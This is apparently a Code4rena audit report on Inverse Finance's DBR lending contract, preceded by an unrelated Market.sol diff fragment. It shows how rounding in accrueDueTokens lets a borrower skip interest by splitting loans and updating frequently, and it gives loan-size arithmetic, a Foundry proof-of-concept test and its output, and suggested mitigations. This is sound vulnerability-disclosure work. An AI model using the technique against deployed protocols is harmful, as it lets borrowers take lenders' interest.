a/src/Market.sol +++ b/src/Market.sol @@ -531,6 +531,7 @@ contract Market {      function repay(address user, uint amount) public {          uint debt = debts[user];          require(debt >= amount, "Insufficient debt"); +        require(dbr.deficitOf(user) == 0, "DBR Deficit");          debts[user] -= amount;          totalDebt -= amount;          dbr.onRepay(user, amount); @@ -563,8 +564,6 @@ contract Market {          uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;          uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;          debts[user] += replenishmentCost; -        uint collateralValue = getCollateralValueInternal(user); -        require(collateralValue >= debts[user], "Exceeded collateral value");          totalDebt += replenishmentCost;          dbr.onForceReplenish(user, amount);          dola.transfer(msg.sender, replenisherReward); ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/DBR.sol#L287   # Vulnerability details  ## Impact  While a user borrows DOLA, his debt position in the DBR contract accrues more debt over time. However, Solidity contracts cannot update their storage automatically over time; state updates must always be triggered by externally owned accounts. For this reason, the DBR contract cannot accurately represent a user's debt position in its storage at all times. Instead, the contract offers a method `accrueDueTokens` that, when called, updates the internal storage with the debts that accrued since the last update. This method is called before all critical financial operations that depend on an accurate value of the accumulated deficit in the contract's storage. On top, this method can also be invoked permissionless at any time. Suppose a borrower manages to call this function periodically and keep the time difference between updates short. In that case, a rounding error in the computation of the accrued debt can cause the expression to round down to zero. In this case, the user successfully avoided paying interest on his debt.  ## Proof of Concept  For reference, here is the affected code:  ~~~Solidity     function accrueDueTokens(address user) public {         uint debt = debts[user];         if(lastUpdated[user] == block.timestamp) return;         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;         dueTokensAccrued[user] += accrued;         totalDueTokensAccrued += accrued;         lastUpdated[user] = block.timestamp;         emit Transfer(user, address(0), accrued);     } ~~~  The problem is that the function updates the `lastUpdated[user]` storage variable even when `accrued` is `0`.  ### Example  Let's assume that the last update occurred at `t_0`. Further assume that the next update occurs at `t_1` with `t_1 - t_0 = 12s`. (`12s` is the current Ethereum block time) Suppose that the user's recorded `debt` position at `t_0 is `1,000,000 wei`. Then the accrued debt formula gives us the following:  ~~~ accrued = (t_1 - t_0) * debt / 365 days         = 12          * 1,000,000 / 31,536,000         = 1,000,000 / 31,536,000         = 0 (because unsigned integer division rounds down) ~~~  ### Maximizing profit  The accrued debt formula rounds towards zero if we have `(t_1 - t_0) * debt < 365 days`. This gives us a method to compute the maximal debt that we can deposit to make the attack more efficient:  ~~~ debt_max = 365 days / 12s -1 = 2,627,999 ~~~  Notice that an attacker is not limited to these small loans. He can split a massive loan into multiple small loans, capped at 2,627,999. To borrow X tokens (where X is given in WEI), we can compute the number of needed loans as:  ~~~ #loans = X / 2,627,999 ~~~  For example, to borrow 1 DOLA:  ~~~ #loans = 10^18 / 2,627,999 = 380517648599 ~~~  To borrow 1,000,000 DOLA we would thus need 380,517,648,599,000,000 small loans.  ### Economical feasibility  The attack would be economically feasible if the costs of the attack were lower than the interest that accrued throughout the successful attack. The dominating factor of the attack costs is the gas costs which the attacker needs to pay to update the accrued interest of the small loans every second. A clever attacker would batch as many updates into a single transaction as possible to minimize the gas overhead of the transaction. Still, at the current block time (12s), gas price (7 gwei), block gas limit (30,000,000), and current ETH price (\$1,550.80), it's hardly imaginable that this attack is economically feasible at the moment.  ### Risk parameters  However, all these values could change in the future. And if we look at other networks, Layer2 or EVM compatible Layer1, the parameters might be different today.  Also, notice that if the contract were used to borrow a different asset than DOLA, the numbers would look drastically different. The risk increases with the asset's price and becomes bigger the fewer decimals the token uses. For example, to borrow 1 WBTC (8 decimals), we would only need 39 small loans:  ~~~ #loans = 10^8 / 2,627,999 ~39 ~~~  And to borrow WBTC worth \$1,000,000 at a price of 20,746\$/BTC, we would need 1864 small loans.  ~~~ #loans ~= 49*10^8 / 2,627,999 ~= 1864 ~~~  ### Foundry  The following test demonstrates how to avoid paying interest on a loan for 1h. A failing test means that the attack was successful.  ~~~ $ git diff src/test/DBR.t.sol diff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol index 3988cf7..8779da7 100644 --- a/src/test/DBR.t.sol +++ b/src/test/DBR.t.sol @@ -25,6 +25,20 @@ contract DBRTest is FiRMTest {          vm.stopPrank();      }   +    function testFail_free_borrow() public { +        uint borrowAmount =  2_627_999; + +        vm.prank(address(market)); +        dbr.onBorrow(user, borrowAmount); + +        for (uint i = 12; i <= 3600; i += 12) { +            vm.warp(block.timestamp + 12); +            dbr.accrueDueTokens(user); +        } +        assertEq(dbr.deficitOf(user), 0); +    } + +      function testOnBorrow_Reverts_When_AccrueDueTokensBringsUserDbrBelow0() public {          gibWeth(user, wethTestAmount);          gibDBR(user, wethTestAmount); ~~~  Output: ~~~ $ forge test --match-test testFail_free_borrow -vv [⠆] Compiling... [⠊] Compiling 1 files with 0.8.17 [⠢] Solc 0.8.17 finished in 2.62s Compiler run successful  Running 1 test for src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543) Test result: FAILED. 0 passed; 1 failed; finished in 8.03ms  Failing tests: Encountered 1 failing test in src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)  Encountered a total of 1 failing tests, 0 tests succeeded ~~~  Classified as a high medium because the yields can get stolen/denied. It's not high risk because I don't see an economically feasible exploit.  ## Tools Used  VSCode, Wolramapha, Foundry  ## Recommended Mitigation Steps  * Document the risks transparently and prominently. * Re-evaluate the risks according to the specific network parameters of every network you want to deploy to. * Do not update the `lastUpdated` timestamp of the user if the computed accrued amount was zero.
